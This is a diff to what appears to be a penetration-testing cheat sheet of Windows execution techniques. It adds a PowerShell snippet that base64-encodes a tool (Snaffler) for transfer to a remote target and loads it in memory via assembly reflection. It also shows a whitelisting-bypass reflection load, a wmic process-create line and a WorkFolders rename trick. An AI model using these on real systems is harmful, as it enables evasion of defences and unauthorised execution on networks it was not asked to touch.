@@ -6,7 +6,7 @@
   `wmic.exe process call create "cmd /c powershell"` 
   
 ## PowerShell Assembly Reflection
-```
+```powershell
 # This technique can in some cases be used to bypass application whitelisting
 # The following example runs the tool Snaffler.exe with the argument -s
 [byte[]]$bytes = get-content -encoding byte -path C:\Users\username\Desktop\Snaffler.exe
@@ -16,6 +16,20 @@ $vars.Add("-s")
 $passed = [string[]]$vars.ToArray()
 $asm.EntryPoint.Invoke($null, @(,$passed))
 ```   
+If you want to use this technique on a remote target, you can b64 encode the bytes and transfer the b64 blob:   
+```powershell
+[byte[]]$bytes = get-content -encoding byte -path 'C:\_data\Snaffler.exe'
+$base64string = [Convert]::ToBase64String($bytes)
+# Transfer b64 file and on target:
+$bytes = [Convert]::FromBase64String($base64string)
+$asm = [System.Reflection.Assembly]::Load($bytes)
+$vars = New-Object System.Collections.Generic.List[System.Object]
+$vars.Add("-s")
+$vars.Add("-o")
+$vars.Add("c:\_data\snaffler.log")
+$passed = [string[]]$vars.ToArray()
+$asm.EntryPoint.Invoke($null, @(,$passed))
+```
 ## Using WorkFolders
 You can use the Workfolders application in Windows to run any binary in the current directory after renaming it to "control.exe":
 ![](screenshot.png)
